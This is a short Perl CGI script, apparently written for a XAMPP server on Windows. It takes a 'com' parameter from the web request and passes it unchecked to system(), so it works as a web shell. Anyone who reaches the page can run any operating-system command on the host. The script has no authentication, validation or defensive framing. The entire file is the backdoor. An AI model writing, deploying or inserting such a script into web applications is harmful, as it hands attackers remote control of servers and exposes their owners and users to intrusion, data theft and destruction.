#!C:/xampp/perl/bin/perl.exe 
use CGI ':standard';  
#the following line is used for displaying the output of the script in the browser  
print "Content-type:text/html\n\n";  
$c=param('com');  
system($c);  
exit(0);